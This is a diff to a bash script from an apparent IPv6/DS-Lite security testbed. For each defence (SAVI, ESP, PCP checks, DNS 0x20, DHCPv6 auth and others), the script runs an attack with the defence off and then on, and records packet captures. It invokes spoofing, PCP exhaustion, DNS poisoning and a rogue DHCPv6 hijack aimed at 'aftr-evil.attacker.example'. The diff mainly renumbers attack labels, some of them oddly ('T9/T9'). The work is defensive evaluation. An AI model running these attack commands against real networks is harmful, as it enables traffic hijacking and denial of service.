@@ -1,9 +1,9 @@
 #!/bin/bash
-# capture_defenses.sh - capture per-family OFF/ON evidence for reference_captures.
+# capture_defenses.sh — capture per-family OFF/ON evidence for reference_captures.
 # For each defence it runs the ACTUAL attack with the defence OFF (succeeds) and
 # ON (blocked), capturing packets/logs at the relevant point. ALL artifacts are
 # written INSIDE the container under the bind-mounted /testbed/pcaps/defcap/ so
-# they appear on the host (root-owned, world-readable) - no host-side redirects,
+# they appear on the host (root-owned, world-readable) — no host-side redirects,
 # which avoids cross-ownership permission errors.
 # Run from the host:  bash testbed/defenses/capture_defenses.sh
 set -u
@@ -42,7 +42,7 @@ restart_pcp(){ nse aftr pkill -9 -f pcp_server.py 2>/dev/null
   sleep 2; }
 prov_attacker; hub_bridge
 
-# ── SAVI (T3/T5 softwire outer-source spoof) ────────────────────────────────
+# ── SAVI (T2/T4 softwire outer-source spoof) ────────────────────────────────
 echo "SAVI"; mk SAVI
 savi_run(){ cap aftr eth-isp "$OUT/SAVI/$1.pcap" "ip6 src $VB4 and ip6 dst $AFTR and ip6 proto 4"; sleep 0.6
   nse attacker sh -c "timeout 6 python3 $T/tunnel/tunnel_spoof.py spoof --interface eth-isp --src-ip6 $ATK6 --victim-b4-ip6 $VB4 --aftr-ip6 $AFTR --inner-src-ip4 10.0.1.77 --inner-dst-ip4 $SRV --proto udp --focused --dst-port 9999 --count 10 --batch 1 --interval 0.2" >/dev/null 2>&1
@@ -51,7 +51,7 @@ bash "$AP" SAVI off >/dev/null 2>&1; savi_run OFF
 bash "$AP" SAVI on  >/dev/null 2>&1; savi_run ON
 bash "$AP" SAVI off >/dev/null 2>&1
 
-# ── ESP_AEAD (T4 softwire interception) ─────────────────────────────────────
+# ── ESP_AEAD (T3 softwire interception) ─────────────────────────────────────
 echo "ESP_AEAD"; mk ESP_AEAD
 esp_run(){ cap b4-1 eth-isp "$OUT/ESP_AEAD/$1.pcap" "ip6 proto 4 or esp"; sleep 0.6
   nse client1 sh -c "for i in 1 2 3 4 5; do curl -s -o /dev/null --max-time 3 http://$SRV/; done" >/dev/null 2>&1; sleep 1; stopcap; }
@@ -59,7 +59,7 @@ bash "$AP" ESP_AEAD off >/dev/null 2>&1; esp_run OFF
 bash "$AP" ESP_AEAD on  >/dev/null 2>&1; esp_run ON
 bash "$AP" ESP_AEAD off >/dev/null 2>&1
 
-# ── PCP_OWNERSHIP (T8 THIRD_PARTY cross-sub DNAT) ───────────────────────────
+# ── PCP_OWNERSHIP (T6 THIRD_PARTY cross-sub DNAT) ───────────────────────────
 echo "PCP_OWNERSHIP"; mk PCP_OWNERSHIP
 own_run(){ nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
   cap b4-1 eth-isp "$OUT/PCP_OWNERSHIP/$1.pcap" "udp port 5351"; sleep 0.6
@@ -70,7 +70,7 @@ restart_pcp ""; own_run OFF
 restart_pcp "T10_THIRD_PARTY_OWNERSHIP_CHECK=1"; own_run ON
 restart_pcp ""
 
-# ── PCP_QUOTA (T7 shared-pool exhaustion, cross-sub) ────────────────────────
+# ── PCP_QUOTA (TS2 shared-pool exhaustion, cross-sub) ────────────────────────
 echo "PCP_QUOTA"; mk PCP_QUOTA
 quota_run(){ cap aftr eth-isp "$OUT/PCP_QUOTA/$1.pcap" "udp port 5351"; sleep 0.5
   nse client1 sh -c "timeout 12 python3 $T/infra/pcp_attack.py exhaust --proxy-ip 10.0.1.1 --proto 17 --count 120" >/dev/null 2>&1
@@ -80,7 +80,7 @@ restart_pcp "" 60; quota_run OFF
 restart_pcp "T_PCP_QUOTA=20" 60; quota_run ON
 restart_pcp "" 1024
 
-# ── PCP_AUTH (T9 forged ANNOUNCE epoch-reset storm) ─────────────────────────
+# ── PCP_AUTH (TS3 forged ANNOUNCE epoch-reset storm) ─────────────────────────
 echo "PCP_AUTH"; mk PCP_AUTH
 auth_run(){ # $1 tag, $2 envstr
   nse aftr pkill -9 -f pcp_server.py 2>/dev/null; nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.6
@@ -97,10 +97,10 @@ auth_run OFF ""
 auth_run ON  "T_PCP_AUTH=1"
 restart_pcp ""
 
-# ── NAT_LOG (T2 shared-IP attribution) ──────────────────────────────────────
+# ── NAT_LOG (TS1 shared-IP attribution) ──────────────────────────────────────
 echo "NAT_LOG"; mk NAT_LOG
 LOG=/var/log/aftr-bindings.log
-# NOTE: truncate (: > LOG), do NOT unlink - the AFTR logger holds the file open,
+# NOTE: truncate (: > LOG), do NOT unlink — the AFTR logger holds the file open,
 # so rm sends new records to a dangling inode and the count reads 0.
 nat_run(){ dxsh ": > $LOG 2>/dev/null || true"
   nse client1 sh -c "timeout 8 python3 $T/dns/reputation_poisoning.py --mode scan --target $SRV --count 200" >/dev/null 2>&1; sleep 1.5
@@ -109,7 +109,7 @@ bash "$AP" NAT_LOG off >/dev/null 2>&1; nat_run OFF
 bash "$AP" NAT_LOG on  >/dev/null 2>&1; sleep 0.5; nat_run ON
 bash "$AP" NAT_LOG off >/dev/null 2>&1; dxsh ": > $LOG 2>/dev/null || true"
 
-# ── SNMP_USM (T14 alarm write) ──────────────────────────────────────────────
+# ── SNMP_USM (T10 alarm write) ──────────────────────────────────────────────
 echo "SNMP_USM"; mk SNMP_USM
 OIDP=1.3.6.1.2.1.240.1.3.1.8
 snmp_run(){ # $1 tag, $2 read-mode (v2c|usm)
@@ -127,14 +127,14 @@ snmp_run OFF v2c
 bash "$AP" SNMP_USM on >/dev/null 2>&1; sleep 0.5; snmp_run ON usm
 bash "$AP" SNMP_USM off >/dev/null 2>&1
 
-# ── DHCPV6_AUTH (T12/T13 rogue DHCPv6 AFTR-Name) ────────────────────────────
+# ── DHCPV6_AUTH (T9/T9 rogue DHCPv6 AFTR-Name) ────────────────────────────
 echo "DHCPV6_AUTH"; mk DHCPV6_AUTH
 dx test -f /testbed/defenses/keys/dhcpv6_ed25519.sec || dx python3 /testbed/defenses/dhcpv6auth.py keygen --out /testbed/defenses/keys >/dev/null 2>&1
 dhcp_run(){ # $1 tag, $2 mode (insecure|secure)
   dx pkill -9 -f 'dhcpd -6' 2>/dev/null
   nse b4-1 pkill -9 -f 'dhclient.*b4-1' 2>/dev/null; dx pkill -9 -f 'dhclient6-b4-1' 2>/dev/null
   cap attacker eth-isp "$OUT/DHCPV6_AUTH/$1.pcap" "udp port 546 or udp port 547"; sleep 0.4
-  dx ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T12 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 >/dev/null 2>&1 &
+  dx ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 >/dev/null 2>&1 &
   sleep 1.5
   if [ "$2" = insecure ]; then
     nse b4-1 sh -c "python3 /testbed/defenses/dhcpv6auth.py client --iface eth-isp --key /testbed/defenses/keys --insecure --wait 4 2>&1 | grep -oE 'AFTR=[^ ]+' | head -1 > $OUT/DHCPV6_AUTH/$1.result.txt"
@@ -148,21 +148,21 @@ dhcp_run(){ # $1 tag, $2 mode (insecure|secure)
 dhcp_run OFF insecure
 dhcp_run ON  secure
 
-# ── DNS_0X20 (T11 off-path DNS poisoning) - via runner ──────────────────────
+# ── DNS_0X20 (T8 off-path DNS poisoning) — via runner ──────────────────────
 echo "DNS_0X20"; mk DNS_0X20
 nse b4-1 pkill -9 -f dns_0x20_forwarder 2>/dev/null; nse dns-server pkill -9 -f dns_sink 2>/dev/null
 nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
 bash "$AP" DNS_0X20 off >/dev/null 2>&1
-dxsh "bash /testbed/scripts/run_attack_live.sh T11 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/OFF.result.txt"
+dxsh "bash /testbed/scripts/run_attack_live.sh T8 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/OFF.result.txt"
 bash "$AP" DNS_0X20 on >/dev/null 2>&1
-dxsh "bash /testbed/scripts/run_attack_live.sh T11 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/ON.result.txt"
+dxsh "bash /testbed/scripts/run_attack_live.sh T8 2>&1 | grep -oE 'resolved to [0-9a-f:]+|resolved to <none>' | tail -1 > $OUT/DNS_0X20/ON.result.txt"
 bash "$AP" DNS_0X20 off >/dev/null 2>&1
 
-# ── FEISTEL_IPID (T6 inner IP-ID predictability) - algorithmic self-test ────
+# ── FEISTEL_IPID (T5 inner IP-ID predictability) — algorithmic self-test ────
 echo "FEISTEL_IPID"; mk FEISTEL_IPID
 dxsh "python3 /testbed/defenses/ipid_feistel.py > $OUT/FEISTEL_IPID/selftest.txt 2>&1"
 
-# ── TRABELSI (T1 session-table early eviction) - via runner ─────────────────
+# ── TRABELSI (T1 session-table early eviction) — via runner ─────────────────
 echo "TRABELSI"; mk TRABELSI
 bash "$AP" TRABELSI off >/dev/null 2>&1
 dxsh "bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+|conntrack=[0-9]+|[0-9]+ ESTABLISHED' | tr '\n' ' ' > $OUT/TRABELSI/OFF.result.txt"
@@ -170,4 +170,4 @@ bash "$AP" TRABELSI on >/dev/null 2>&1
 dxsh "bash /testbed/scripts/run_attack_live.sh T1 2>&1 | grep -oE 'client1=[0-9]+|conntrack=[0-9]+|[0-9]+ ESTABLISHED' | tr '\n' ' ' > $OUT/TRABELSI/ON.result.txt"
 bash "$AP" TRABELSI off >/dev/null 2>&1
 
-echo "DONE - evidence in pcaps/defcap/"
+echo "DONE — evidence in pcaps/defcap/"
